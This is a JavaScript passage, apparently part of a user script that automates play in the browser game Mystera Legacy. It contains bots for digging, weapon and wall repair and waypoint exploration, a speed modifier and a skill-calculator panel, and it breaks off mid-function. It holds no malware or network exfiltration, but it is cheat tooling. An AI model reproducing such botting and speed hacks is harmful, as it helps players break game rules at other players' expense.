async function HealBot() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;
  if (xGoing[115] === true) return;
  xGoing[115] = true;

  if (inv[0].equip === 2) {
    // Arma gasta — ciclo de reparo
    await xDoKeyUp(6);
    await xDelay(400);
    await xDoMove(myself.x, myself.y + 1);
    await xDelay(500);
    await xDoDropSlot(1, 1);
    await xDelay(400);
    await xDoMove(myself.x, myself.y - 1);
    await xDelay(500);
    await xDoPickUp();
    await xDelay(400);
    await xDoUseSlot(0);
    await xDelay(400);
  } else {
    // Arma ok — ataca
    if (!keySpace.isDown && inv[0].sprite !== undefined && inv[0].equip === 1) {
      await xDoKeyDown(6);
      await xDelay(800);
    }
  }

  xGoing[115] = false;
}

// ── CLAY BOT ─────────────────────────────────────────────────

dsk.clay = { enabled: false, repairing: false };

async function repairItemClay() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  dsk.clay.repairing = true;
  await xDoKeyUp(6);
  await xDelay(345);
  await xDoDropSlot(1, 1);
  await xDelay(635);
  await xDoMove(myself.x + 1, myself.y);
  await xDelay(635);
  await xDoChangeDir(3);
  await xDelay(459);
  await xDoUseSlot(xGetSlotByID(719));
  await xDelay(369);

  const firstEquippable = item_data.filter(el => el && el.eqp !== 0 && el.spr === 719)[0];
	if (firstEquippable) {
    // Continua pressionando até o item estar perfeito
    while (!xIfChatHas("is in perfect condition")) {
        await xDoKeyPress(6, 189);
        await xDelay(400);
        // Segurança: sai do loop se o bot for desativado
        if (!dsk.clay.enabled) {
            dsk.clay.repairing = false;
            return;
        }
    }
	}

  if (xIfChatHas("is in perfect condition")) {
    xDoClearChat("is in perfect condition");
    await xDelay(349);
    await xDoMove(myself.x - 1, myself.y);
    await xDelay(649);
    await xDoPickUp();
    await xDelay(354);
    await xDoUseSlot(0);
    await xDelay(389);
    await xDoChangeDir(0);
    await xDelay(346);
    dsk.clay.repairing = false;
  } else {
    // Ainda reparando — libera após timeout de segurança
    setTimeout(() => { dsk.clay.repairing = false; }, 6000);
  }
}

async function ClayBot() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (dsk.clay.repairing) return;

  // Parar se atingir o level alvo
  if (currentLevel > 0 && skillLevel >= currentLevel && skillName === 'digging') {
    await xDoKeyUp(6);
    xGoing[114] = false;
    dsk.clay.enabled = false;
    dsk.localMsg('Clay Bot: Desativado', '#f55');
    return;
  }

  if (xGoing[114] === true) return;
  xGoing[114] = true;

  if (xIfChatHas("Disconnected (Packet Spamming)")) {
    await xDelay(300);
    await xDoClearChat("Disconnected (Packet Spamming)");
    await xDelay(300);
    await xDoKeyUp(6);
    xGoing[114] = false;
    return;
  }

  if (xIfChatHas("Welcome back ")) {
    await xDelay(1000);
    await xDoClearChat("Welcome back ");
    await xDelay(1000);
    await xDoKeyUp(6);
  }

  // Reparo tem prioridade
  if (inv[0].equip === 2) {
    await repairItemClay();
    xGoing[114] = false;
    return;
  }

  const allowedNames = ['Animal Gate', 'Stone Wall', 'Tribe Gate', 'Signpost', 'Wood Wall', 'Personal Gate'];

  if (occupied(myself.x, myself.y - 2) === 0) {
    await xDoMove(myself.x, myself.y - 1);
  } else if (occupied(myself.x, myself.y - 1) === 0 && occupied(myself.x, myself.y + 1) === 0) {
    if (myself.dir !== 0) {
      await xDelay(356);
      await xDoChangeDir(0);
    }
    await xDelay(345);
    await xDoKeyDown(6);
  } else if (occupied(myself.x, myself.y - 1) === 1 && occupied(myself.x, myself.y + 1) === 0) {
    await xDoMove(myself.x, myself.y + 1);
    if (myself.dir !== 0) {
      await xDelay(357);
      await xDoChangeDir(0);
    }
    xGoing[114] = false;
    return;
  }

	const wallBelow = objects.items.find(el =>
		el && allowedNames.includes(el.name) &&
		el.x === myself.x && el.y === (myself.y + 1)
		// ← sem checar dir aqui
	);

	if (wallBelow) {
		if (myself.dir !== 0) {
		  await xDelay(357);
		  await xDoChangeDir(0);
		  await xDelay(546);
		}
		await xDoKeyDown(6);
		xGoing[114] = false;
		return;
	}

  xGoing[114] = false;
}

dsk.setCmd('/clay', () => {
  dsk.clay.enabled = !dsk.clay.enabled;

  if (dsk.clay.enabled) {
    dsk.clay.repairing = false;
    dsk.localMsg('Clay Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.clay.enabled) {
        await ClayBot();
        await xDelay(300);
      }
    })();
  } else {
    xGoing[114] = false;
    xDoKeyUp(6);
    dsk.clay.repairing = false;
    dsk.localMsg('Clay Bot: Desativado', '#f55');
  }
});

dsk.baseRepair = {
  enabled: false,
  kitSlot: 2,
  wpIndex: 0,
  waypointsGalebrook: [
    // Corredor de cima → repara cima e baixo
    { x: 102, y: 254, dirs: [0, 3] },
    { x: 104, y: 254, dirs: [0, 2] },
	{ x: 107, y: 254, dirs: [0, 2] },
	{ x: 110, y: 254, dirs: [0, 2] },
	{ x: 113, y: 254, dirs: [0, 2] },
	{ x: 116, y: 254, dirs: [0, 2] },
	{ x: 119, y: 254, dirs: [0, 2] },
	{ x: 122, y: 254, dirs: [0, 2] },
	{ x: 125, y: 254, dirs: [0, 2] },
	{ x: 128, y: 254, dirs: [0, 2] },
	{ x: 131, y: 254, dirs: [0, 2] },
	{ x: 134, y: 254, dirs: [0, 2] },
	{ x: 137, y: 254, dirs: [0, 2] },
	{ x: 140, y: 254, dirs: [0, 2] },
	{ x: 143, y: 254, dirs: [0, 2] },
	{ x: 146, y: 254, dirs: [0, 2] },
	{ x: 149, y: 254, dirs: [0, 2] },
	{ x: 152, y: 254, dirs: [0, 2] },
	{ x: 155, y: 254, dirs: [0, 2] },
	{ x: 157, y: 254, dirs: [0, 1] },

    // Corredor direito → repara direita e esquerda
    { x: 157, y: 257, dirs: [1, 3] },
	{ x: 157, y: 260, dirs: [1, 3] },
	{ x: 157, y: 263, dirs: [1, 3] },
	{ x: 157, y: 266, dirs: [1, 3] },
	{ x: 157, y: 269, dirs: [1, 3] },
	{ x: 157, y: 272, dirs: [1, 3] },
	{ x: 157, y: 275, dirs: [1, 3] },
	{ x: 157, y: 278, dirs: [1, 3] },
	{ x: 157, y: 281, dirs: [1, 3] },
	{ x: 157, y: 284, dirs: [1, 3] },
	{ x: 157, y: 287, dirs: [1, 3] },
	{ x: 157, y: 290, dirs: [1, 3] },
	{ x: 157, y: 292, dirs: [1, 2] },

    // Corredor de baixo → repara cima e baixo
    { x: 154, y: 292, dirs: [0, 2] },
    { x: 151, y: 292, dirs: [0, 2] },
	{ x: 148, y: 292, dirs: [0, 2] },
	{ x: 145, y: 292, dirs: [0, 2] },
	{ x: 142, y: 292, dirs: [0, 2] },
	{ x: 139, y: 292, dirs: [0, 2] },
	{ x: 136, y: 292, dirs: [0, 2] },
	{ x: 133, y: 292, dirs: [0, 2] },
	{ x: 130, y: 292, dirs: [0, 2] },
	{ x: 127, y: 292, dirs: [0, 2] },
	{ x: 124, y: 292, dirs: [0, 2] },
	{ x: 121, y: 292, dirs: [0, 2] },
	{ x: 118, y: 292, dirs: [0, 2] },
	{ x: 115, y: 292, dirs: [0, 2] },
	{ x: 112, y: 292, dirs: [0, 2] },
	{ x: 109, y: 292, dirs: [0, 2] },
	{ x: 106, y: 292, dirs: [0, 2] },
	{ x: 103, y: 292, dirs: [0, 2] },
	{ x: 102, y: 292, dirs: [2, 3] },

    // Corredor esquerdo → repara direita e esquerda
    { x: 102,  y: 290, dirs: [1, 3] },
	{ x: 102,  y: 287, dirs: [1, 3] },
	{ x: 102,  y: 284, dirs: [1, 3] },
	{ x: 102,  y: 281, dirs: [1, 3] },
    { x: 102,  y: 279, dirs: [1, 3] },
	{ x: 102,  y: 276, dirs: [1, 3] },
	{ x: 102,  y: 273, dirs: [1, 3] },
	{ x: 102,  y: 270, dirs: [1, 3] },
	{ x: 102,  y: 267, dirs: [1, 3] },
	{ x: 102,  y: 264, dirs: [1, 3] },
	{ x: 102,  y: 261, dirs: [1, 3] },
	{ x: 102,  y: 258, dirs: [1, 3] },
	{ x: 102,  y: 255, dirs: [1, 3] },
  ],
  
    waypointsUnderground: [
    // Corredor de cima → repara cima e baixo
    { x: 129, y: 252, dirs: [0, 2] },
    { x: 126, y: 252, dirs: [0, 2] },
	{ x: 123, y: 252, dirs: [0, 2] },
	{ x: 120, y: 252, dirs: [0, 2] },
	{ x: 117, y: 252, dirs: [0, 2] },
	{ x: 114, y: 252, dirs: [0, 2] },
	{ x: 111, y: 252, dirs: [0, 2] },
	{ x: 108, y: 252, dirs: [0, 2] },
	{ x: 105, y: 252, dirs: [0, 2] },
	{ x: 102, y: 252, dirs: [0, 3] },

    // Corredor esqerdo → repara direita e esquerda
    { x: 102, y: 254, dirs: [1, 3] },
    { x: 102, y: 257, dirs: [1, 3] },
	{ x: 102, y: 260, dirs: [1, 3] },
	{ x: 102, y: 263, dirs: [1, 3] },
	{ x: 102, y: 266, dirs: [1, 3] },
	{ x: 102, y: 269, dirs: [1, 3] },
	{ x: 102, y: 272, dirs: [1, 3] },
	{ x: 102, y: 275, dirs: [1, 3] },
	{ x: 102, y: 278, dirs: [1, 3] },
	{ x: 102, y: 281, dirs: [1, 3] },
	{ x: 102, y: 284, dirs: [1, 3] },
	{ x: 102, y: 285, dirs: [2, 3] },

    // Corredor de baixo → repara cima e baixo
    { x: 105, y: 285, dirs: [0, 2] },
    { x: 108, y: 285, dirs: [0, 2] },
	{ x: 111, y: 285, dirs: [0, 2] },
	{ x: 114, y: 285, dirs: [0, 2] },
	{ x: 117, y: 285, dirs: [0, 2] },
	{ x: 120, y: 285, dirs: [0, 2] },
	{ x: 123, y: 285, dirs: [0, 2] },
	{ x: 126, y: 285, dirs: [0, 2] },
	{ x: 129, y: 285, dirs: [0, 2] },
	{ x: 132, y: 285, dirs: [0, 2] },
	{ x: 135, y: 285, dirs: [0, 2] },
	{ x: 138, y: 285, dirs: [0, 2] },
	{ x: 141, y: 285, dirs: [0, 2] },
	{ x: 144, y: 285, dirs: [0, 2] },
	{ x: 147, y: 285, dirs: [0, 2] },
	{ x: 150, y: 285, dirs: [0, 2] },
	{ x: 153, y: 285, dirs: [0, 2] },
	{ x: 156, y: 285, dirs: [0, 2] },
	{ x: 158, y: 285, dirs: [1, 2] },

    // Corredor direito → repara direita e esquerda
    { x: 158,  y: 282, dirs: [1, 3] },
    { x: 158,  y: 279, dirs: [1, 3] },
	{ x: 158,  y: 276, dirs: [1, 3] },
	{ x: 158,  y: 273, dirs: [1, 3] },
	{ x: 158,  y: 270, dirs: [1, 3] },
	{ x: 158,  y: 267, dirs: [1, 3] },
	{ x: 158,  y: 264, dirs: [1, 3] },
	{ x: 158,  y: 261, dirs: [1, 3] },
	{ x: 158,  y: 258, dirs: [1, 3] },
	{ x: 158,  y: 255, dirs: [1, 3] },
	{ x: 158,  y: 252, dirs: [0, 1] },
	// Corredor cima → repara cima e baixo
	{ x: 156, y: 252, dirs: [0, 2] },
	{ x: 153, y: 252, dirs: [0, 2] },
	{ x: 150, y: 252, dirs: [0, 2] },
	{ x: 147, y: 252, dirs: [0, 2] },
	{ x: 144, y: 252, dirs: [0, 2] },
	{ x: 141, y: 252, dirs: [0, 2] },
	{ x: 138, y: 252, dirs: [0, 2] },
	{ x: 135, y: 252, dirs: [0, 2] },
	{ x: 132, y: 252, dirs: [0, 2] },
  ],
  
  get waypoints() {                                    // ← aqui, dentro do {}
    const map = jv.map_title?.text ?? '';
    if (map.includes('Underground')) return this.waypointsUnderground;
    if (map.includes('Galebrook'))   return this.waypointsGalebrook;
    return this.waypointsGalebrook;
  },
};

// ← aqui fora, logo abaixo do objeto
function xGetWallHpByDir(dir) {
  if (dir === 0) return xGetWallHp(myself.x,     myself.y - 1);
  if (dir === 1) return xGetWallHp(myself.x + 1, myself.y    );
  if (dir === 2) return xGetWallHp(myself.x,     myself.y + 1);
  if (dir === 3) return xGetWallHp(myself.x - 1, myself.y    );
  return -1;
}

async function BaseRepairBot() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;
  if (xGoing[117] === true) return;
  xGoing[117] = true;

  // ── Troca kit quebrado ────────────────────────────────────────
  if (inv[0]?.equip === 2) {
  await xDoKeyUp(6);
  await xDelay(400);

  // Verifica se ainda tem kit no slot alvo
  if (inv[dsk.baseRepair.kitSlot - 1]?.sprite === 719) {
    await xDoSwapSlot(1, dsk.baseRepair.kitSlot); // traz pro slot 0
    await xDelay(400);
    await xDoUseSlot(0); // equipa
    await xDelay(600);
    dsk.baseRepair.kitSlot++; // próxima vez usa o slot seguinte
  } else {
    dsk.localMsg('Base Repair: sem kits restantes!', '#f55');
    dsk.baseRepair.enabled = false;
    xGoing[117] = false;
    return;
  }
}

  // ── Move para o waypoint atual ────────────────────────────────
  const wp = dsk.baseRepair.waypoints[dsk.baseRepair.wpIndex];
  if (!wp) {
    dsk.baseRepair.wpIndex = 0;
    xGoing[117] = false;
    return;
  }

  const dist = Math.abs(myself.x - wp.x) + Math.abs(myself.y - wp.y);
  if (dist > 0) {
    await xDoMove(wp.x, wp.y);
    await xDelay(600);
    xGoing[117] = false;
    return;
  }

  // ── Repara nas direções definidas no waypoint ─────────────────
  // dirs: 0=cima, 1=direita, 2=baixo, 3=esquerda
	for (const dir of wp.dirs) {
	  await xDoChangeDir(dir);
	  await xDelay(350);

	  // primeiro toque para revelar o HP
	  await xDoKeyPress(6, 200);
	  await xDelay(600);

	  // continua reparando até 95% ou sumir
	  while (xGetWallHpByDir(dir) < 99 && xGetWallHpByDir(dir) !== -1) {
		if (inv[0]?.equip === 2) {
		  xGoing[117] = false;
		  return; // kit quebrou, sai para trocar
		}
		await xDoKeyPress(6, 200);
		await xDelay(400);
	  }
	}

  // ── Próximo waypoint ──────────────────────────────────────────
  dsk.baseRepair.wpIndex++;
  if (dsk.baseRepair.wpIndex >= dsk.baseRepair.waypoints.length) {
    dsk.baseRepair.wpIndex = 0;
    dsk.localMsg('Base Repair: ciclo completo, reiniciando...', '#0ff');
  }

  xGoing[117] = false;
}

dsk.setCmd('/baserepair', () => {
  dsk.baseRepair.enabled = !dsk.baseRepair.enabled;

  if (dsk.baseRepair.enabled) {
    dsk.baseRepair.wpIndex = 0;
	dsk.baseRepair.kitSlot = 2;
    dsk.localMsg(`Base Repair: Ativado (${dsk.baseRepair.waypoints.length} waypoints)`, '#5f5');
    (async function loop() {
      while (dsk.baseRepair.enabled) {
        await BaseRepairBot();
        await xDelay(300);
      }
    })();
  } else {
    xGoing[117] = false;
    xDoKeyUp(6);
    dsk.localMsg('Base Repair: Desativado', '#f55');
  }
});


// ── AUTO EXPLO ─────────────────────────────────────────────────

dsk.explo = {
  enabled: false,
  wpIndex: 0,
  waypoints: [
    { x: 465, y: 363 }, { x: 465, y: 190 }, { x: 455, y: 190 }, { x: 455, y: 363 },
    { x: 445, y: 363 }, { x: 445, y: 190 }, { x: 435, y: 190 }, { x: 435, y: 363 },
    { x: 425, y: 363 }, { x: 425, y: 190 }, { x: 415, y: 190 }, { x: 415, y: 363 },
    { x: 405, y: 363 }, { x: 405, y: 190 }, { x: 395, y: 190 }, { x: 395, y: 363 },
    { x: 385, y: 363 }, { x: 385, y: 190 }, { x: 375, y: 190 }, { x: 375, y: 363 },
    { x: 365, y: 363 }, { x: 365, y: 190 }, { x: 355, y: 190 }, { x: 355, y: 363 },
    { x: 345, y: 363 }, { x: 345, y: 190 }, { x: 335, y: 190 }, { x: 335, y: 363 },
    { x: 325, y: 363 }, { x: 325, y: 190 }, { x: 315, y: 190 }, { x: 315, y: 363 },
    { x: 305, y: 363 }, { x: 305, y: 190 }, { x: 295, y: 190 }, { x: 295, y: 191 },
    { x: 295, y: 363 }, { x: 465, y: 363 },
  ],
};

async function xExplo() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;
  if (xGoing[121] === true) return;
  xGoing[121] = true;

  const wp = dsk.explo.waypoints[dsk.explo.wpIndex];
  if (!wp) {
    dsk.explo.wpIndex = 0;
    xGoing[121] = false;
    return;
  }

  const dist = Math.abs(myself.x - wp.x) + Math.abs(myself.y - wp.y);

  // Ativa speed quando longe, desativa quando perto
  if (dist > 10 && !dsk.speed.interval) {
    dsk.speed.value = 170;
    dsk.speed.start();
  } else if (dist <= 10 && dsk.speed.interval) {
    dsk.speed.stop();
  }

  if (dist <= 2) {
    // Chegou no waypoint → próximo
    dsk.speed.stop();
    dsk.explo.wpIndex++;

    if (dsk.explo.wpIndex >= dsk.explo.waypoints.length) {
      dsk.explo.wpIndex = 0;
      dsk.localMsg('Explo: ciclo completo, reiniciando...', '#0ff');
    }

    xMovingNow = false;
    xGoing[121] = false;
    return;
  }

  // Move para o waypoint
  if (!xMovingNow) {
    await xDoMove(wp.x, wp.y);
  }

  xGoing[121] = false;
}

dsk.setCmd('/explo', () => {
  dsk.explo.enabled = !dsk.explo.enabled;

  if (dsk.explo.enabled) {
    dsk.explo.wpIndex = 0;
    dsk.localMsg('Auto Explo: Ativado', '#5f5');
    (async function loop() {
      while (dsk.explo.enabled) {
        await xExplo();
        await xDelay(300);
      }
      // Desliga speed ao parar
      dsk.speed.stop();
      xMovingNow = false;
      xGoing[121] = false;
    })();
  } else {
    dsk.explo.enabled = false;
    dsk.speed.stop();
    xMovingNow = false;
    xGoing[121] = false;
    dsk.localMsg('Auto Explo: Desativado', '#f55');
  }
});


/*```

A lógica de `dirs` fica assim:
```
dirs: [0, 2]  → repara cima (0) e baixo (2)   ← corredores top/bottom
dirs: [1, 3]  → repara direita (1) e esquerda (3) ← corredores left/right
dirs: [0]     → só cima (canto, por exemplo)
dirs: [0,1,2,3] → repara todas as 4 direções (sala central)*/

// ── TOP SKILL CALCULATOR ─────────────────────────────────────
// Baseado na planilha "Mystera Legacy Top Skill Calculator" by Sidran (EU)
//
// Adicione este bloco ao final do seu _pabloLoad, antes do fechamento };
//
// COMO USAR:
//   /topskill        → abre/fecha o painel
//   /topskill reset  → reseta as estrelas de mastery salvas

// ── Fórmulas da planilha ──────────────────────────────────────

const TSC_A = 1.0315834879;
const TSC_B = 3.324817;

function tscXP(level) {
  return TSC_A * Math.pow(level, TSC_B);
}

function tscRawXP(level, stars) {
  return TSC_A * Math.pow(level, TSC_B) - TSC_A * Math.pow(10 * stars, TSC_B);
}

function tscNomLvl(level, stars) {
  const raw = tscRawXP(level, stars);
  if (raw <= 0) return Math.pow(0, 1 / TSC_B) - 2 * stars; // 0 - 2*stars
  return Math.pow(raw / TSC_A, 1 / TSC_B) - 2 * stars;
}

function tscNeeded(level, stars, topNomLvl) {
  const goalXP = TSC_A * Math.pow(topNomLvl + 2 * stars, TSC_B)
               + TSC_A * Math.pow(10 * stars, TSC_B);
  return Math.pow(goalXP / TSC_A, 1 / TSC_B) - level;
}

function tscCharXP(level, stars, skillMastery) {
  // char XP = se level >= (skillMastery+1)*10 → capped, senão rawXP
  const cap = (skillMastery + 1) * 10;
  if (level >= cap) {
    return TSC_A * Math.pow(cap, TSC_B)
         - (stars > 0 ? TSC_A * Math.pow(Math.min(stars, skillMastery + 1) * 10, TSC_B) : 0);
  }
  return tscRawXP(level, stars);
}

// Lê todos os skills disponíveis em jv.skills
// data[0] = estrelas ★, data[1] = level atual
function tscGetSkillsFromGame() {
  if (!jv.skills) return [];
  return Object.entries(jv.skills).map(([name, data]) => ({
    name,
    level: Math.floor(data[1] || 0),
    stars: Math.floor(data[0] || 0),
  })).filter(s => s.level > 0);
}

// ── Cálculo principal ─────────────────────────────────────────

function tscCalculate() {
  const skills = tscGetSkillsFromGame();

  // Calcula nomLvl para cada skill usando stars do jogo
  const withNom = skills.map(s => {
    const nom = tscNomLvl(s.level, s.stars);
    return { ...s, nom };
  });

  // Encontra o TOP (maior nomLvl)
  const topNom = Math.max(...withNom.map(s => s.nom));

  // Calcula "levels needed" para cada skill
  const result = withNom.map(s => {
    const isTop  = Math.abs(s.nom - topNom) < 0.01;
    const needed = isTop ? 0 : tscNeeded(s.level, s.stars, topNom);
    return { ...s, isTop, needed, topNom };
  });

  // Ordena: TOP primeiro, depois por "needed" crescente
  result.sort((a, b) => {
    if (a.isTop) return -1;
    if (b.isTop) return 1;
    return a.needed - b.needed;
  });

  const charLevel = myself?.level ?? 0;
  return { skills: result, topNom, charLevel };
}

// ── DIALOG ────────────────────────────────────────────────────

dsk.tsc = {
  enabled: false,
  page: 0,
  perPage: 8,
  editSkill: null,
};

dsk.tscDialog = jv.Dialog.create(310, 310);
const tscD = dsk.tscDialog;
tscD.visible = false;

// Header
tscD.hdr = jv.text('Top Skill Calculator', {
  font: '13px Verdana', fill: 0xFFD700, stroke: 0x555555, strokeThickness: 2,
});
tscD.addChild(tscD.hdr);
jv.center(tscD.hdr);
jv.top(tscD.hdr, 4);

// Botões fechar / mover
const tscBtnClose = jv.Button.create(0, 0, 24, 'X', tscD, 24);
jv.top(tscBtnClose, 4); jv.right(tscBtnClose, 4);
tscBtnClose.on_click = () => { tscD.visible = 0; dsk.tsc.enabled = false; };

const tscBtnMove = jv.Button.create(0, 0, 24, '@', tscD, 24);
jv.top(tscBtnMove, 4); jv.right(tscBtnMove, 28);

// Drag
tscD._px = 0; tscD._py = 0;
window.addEventListener('mousemove', e => { tscD._px = e.clientX; tscD._py = e.clientY; });
window.addEventListener('touchmove', e => { tscD._px = e.touches[0].clientX; tscD._py = e.touches[0].clientY; });
dsk.on('postLoop', () => {
  if (!tscBtnMove.is_pressed) {
    tscD.x = Math.max(0, Math.min(tscD.x, jv.game_width  - tscD.w));
    tscD.y = Math.max(0, Math.min(tscD.y, jv.game_height - tscD.h));
    return;
  }
  const canvas = document.querySelector('canvas');
  const rect = canvas ? canvas.getBoundingClientRect() : {left:0,top:0,width:jv.game_width,height:jv.game_height};
  tscD.x = (tscD._px - rect.left)*(jv.game_width/rect.width)  - tscD.w/2;
  tscD.y = (tscD._py - rect.top) *(jv.game_height/rect.height) - 12;
});

// Labels de status
tscD.lblChar = jv.text('Char Level: -', {
  font: '11px Verdana', fill: 0x88ffff, stroke: 0x000000, strokeThickness: 2,
});
tscD.lblChar.x = 8; tscD.lblChar.y = 26;
tscD.addChild(tscD.lblChar);

tscD.lblTop = jv.text('TOP: -', {
  font: '11px Verdana', fill: 0xFFD700, stroke: 0x000000, strokeThickness: 2,
});
tscD.lblTop.x = 8; tscD.lblTop.y = 38;
tscD.addChild(tscD.lblTop);

// Cabeçalho da tabela
const tscMkHdr = (txt, x, y) => {
  const l = jv.text(txt, { font: '9px Verdana', fill: 0xaaaaaa, stroke: 0x000000, strokeThickness: 2 });
  l.x = x; l.y = y; tscD.addChild(l); return l;
};
tscMkHdr('Skill',    8,  52);
tscMkHdr('Lvl',    155,  52);
tscMkHdr('★',      185,  52);
tscMkHdr('nomLvl', 210,  52);
tscMkHdr('needed', 262,  52);

// Linhas de skill
tscD.rows = [];
for (let i = 0; i < 8; i++) {
  const y = 63 + i * 24;

  const name = jv.text('-', { font: '10px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2 });
  name.x = 8; name.y = y;

  const lvl = jv.text('-', { font: '10px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2 });
  lvl.x = 155; lvl.y = y;

  const stars = jv.text('-', { font: '10px Verdana', fill: 0xFFD700, stroke: 0x000000, strokeThickness: 2 });
  stars.x = 185; stars.y = y;

  const nom = jv.text('-', { font: '10px Verdana', fill: 0xaaffaa, stroke: 0x000000, strokeThickness: 2 });
  nom.x = 210; nom.y = y;

  const needed = jv.text('-', { font: '10px Verdana', fill: 0xffaaaa, stroke: 0x000000, strokeThickness: 2 });
  needed.x = 258; needed.y = y;

  [name, lvl, stars, nom, needed].forEach(el => tscD.addChild(el));
  tscD.rows.push({ name, lvl, stars, nom, needed });
}

// Paginação
const tscBtnPrev = jv.Button.create(0, 0, 24, '<', tscD, 22);
jv.bottom(tscBtnPrev, 4); tscBtnPrev.x = tscD.w - 58;
tscBtnPrev.on_click = () => { if (dsk.tsc.page > 0) { dsk.tsc.page--; tscRender(); } };

const tscBtnNext = jv.Button.create(0, 0, 24, '>', tscD, 22);
jv.bottom(tscBtnNext, 4); tscBtnNext.x = tscD.w - 30;
tscBtnNext.on_click = () => {
  const { skills } = tscCalculate();
  const max = Math.ceil(skills.length / dsk.tsc.perPage) - 1;
  if (dsk.tsc.page < max) { dsk.tsc.page++; tscRender(); }
};

tscD.lblPage = jv.text('1/1', { font: '10px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2 });
tscD.lblPage.x = tscD.w - 100; jv.bottom(tscD.lblPage, 8);
tscD.addChild(tscD.lblPage);

// Botão Recalcular
const tscBtnCalc = jv.Button.create(8, tscD.h - 30, 100, '↺ Recalcular', tscD, 22);
tscBtnCalc.on_click = () => tscRender();

// ── Render ────────────────────────────────────────────────────

function tscRender() {
  if (!myself || !jv.skills) return;

  const { skills, charLevel } = tscCalculate();
  const page  = dsk.tsc.page;
  const total = Math.ceil(skills.length / dsk.tsc.perPage);
  const slice = skills.slice(page * dsk.tsc.perPage, (page + 1) * dsk.tsc.perPage);

  // Pega o TOP
  const top = skills.find(s => s.isTop);
  tscD.lblChar.text = `Char Level: ${charLevel}`;
  tscD.lblTop.text  = top ? `⚠ TREINAR: ${top.name.toUpperCase()} (nomLvl ${top.nom.toFixed(1)})` : 'TOP: -';
  tscD.lblPage.text = `${page + 1}/${total || 1}`;

  // Atualiza linhas
  for (let i = 0; i < tscD.rows.length; i++) {
    const row = tscD.rows[i];
    const sk  = slice[i];

    if (!sk) {
      row.name.text   = '';
      row.lvl.text    = '';
      row.stars.text  = '';
      row.nom.text    = '';
      row.needed.text = '';
      continue;
    }

    row.name.text   = sk.name.slice(0, 18);
    row.lvl.text    = String(sk.level);
    row.stars.text  = `★${sk.stars}`;
    row.nom.text    = sk.nom.toFixed(1);

    if (sk.isTop) {
      row.needed.text           = 'TOP ✓';
      row.needed.style.fill     = 0x44ff44;
      row.nom.style.fill        = 0xFFD700;
      row.name.style.fill       = 0xFFD700;
    } else {
      const n = sk.needed;
      row.needed.text           = `+${n.toFixed(1)}`;
      row.needed.style.fill     = n < 5 ? 0xffff44 : 0xffaaaa;
      row.nom.style.fill        = 0xaaffaa;
      row.name.style.fill       = 0xffffff;
    }
  }
}

// ── Atualiza automaticamente a cada 5s ───────────────────────

let tscTimer = 0;
dsk.on('postLoop', () => {
  if (!tscD.visible) return;
  tscTimer++;
  if (tscTimer % 300 === 0) tscRender(); // ~5s @ 60fps
});

// ── Comando ───────────────────────────────────────────────────

dsk.setCmd('/topskill', () => {
  dsk.tsc.enabled = !dsk.tsc.enabled;
  tscD.visible = dsk.tsc.enabled;

  if (dsk.tsc.enabled) {
    dsk.tsc.page = 0;
    tscRender();
    dsk.localMsg('Top Skill Calc: Aberto', '#5f5');
  } else {
    dsk.localMsg('Top Skill Calc: Fechado', '#f55');
  }
});


// ── REPAIR BOT ─────────────────────────────────────────────────
// Layout:
//        {Wall}
//   boneco {Wall}   ← repair kit no mesmo sqm do boneco
//        {Wall}

dsk.repair = { enabled: false };

async function RepairBot() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  // Para ao atingir o level alvo
  if (currentLevel > 0 && skillLevel >= currentLevel && skillName === 'repairing') {
    await xDoKeyUp(6);
    xGoing[116] = false;
    dsk.repair.enabled = false;
    dsk.localMsg('Repair Bot: Desativado', '#f55');
    return;
  }

  if (xGoing[116] === true) return;
  xGoing[116] = true;

  // Garante direção inicial → direita
  if (myself.dir !== 1) {
    await xDoChangeDir(1);
    await xDelay(620);
  }

  // ── FASE 1: bater nas paredes com a arma ──────────────────────

  await xDoKeyPress(6, 183);     // bate > direita
  await xDelay(745);

  await xDoChangeDir(0);         // vira pra cima 
  await xDelay(744);
  await xDoKeyPress(6, 181);     // bate /\ cima
  await xDelay(747);

  await xDoChangeDir(2);         // vira pra baixo 
  await xDelay(744);
  await xDoKeyPress(6, 184);     // bate \/ baixo
  await xDelay(642);

  // ── PICKUP + EQUIPA repair kit ─────────────────────────────────

  await xDoPickUp();             // pega o kit do mesmo sqm (sem se mover)
  await xDelay(610);
  await xDoUseSlot(0);           // equipa (slot 0)
  await xDelay(1020);

  // ── FASE 2: reparar as paredes ────────────────────────────────

  await xDoChangeDir(1);         // vira pra direita 
  await xDelay(744);
  await xDoKeyPress(6, 182);     // repara > direita
  await xDelay(743);

  await xDoChangeDir(0);         // vira pra cima 
  await xDelay(744);
  await xDoKeyPress(6, 180);     // repara /\ cima
  await xDelay(746);

  await xDoChangeDir(2);         // vira pra baixo
  await xDelay(744);
  await xDoKeyPress(6, 183);     // repara \/ baixo
  await xDelay(744);

  // ── DROP kit + reseta direção ──────────────────────────────────

  await xDoDropSlot(1, 1);       // dropa slot 0 (1 unidade)
  await xDelay(610);
  await xDoChangeDir(1);         // vira pra frente (direita) >
  await xDelay(744);

  xGoing[116] = false;
}

dsk.setCmd('/repair', () => {
  dsk.repair.enabled = !dsk.repair.enabled;

  if (dsk.repair.enabled) {
    dsk.localMsg('Repair Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.repair.enabled) {
        await RepairBot();
        await xDelay(300);
      }
    })();
  } else {
    xGoing[116] = false;
    xDoKeyUp(6);
    dsk.localMsg('Repair Bot: Desativado', '#f55');
  }
});

function xGetCarawayAmt() {
    for (i in ui_container.children) {
        if (ui_container.children[0].children[i] != undefined) {
            if (ui_container.children[0].children[i].t != undefined) {
                if (ui_container.children[0].children[i].t.indexOf('Slowed') != -1) {
                    return parseInt(ui_container.children[0].children[i].t.replace(/[^\d.]/g, '')) / 100;
                }
            }
        }
    }
}

function xGetEffctByName(nam) {
    for (i in ui_container.children) {
        if (ui_container.children[0].children[i] != undefined) {
            if (ui_container.children[0].children[i].t != undefined) {
                if (ui_container.children[0].children[i].t.indexOf(nam) != -1) {
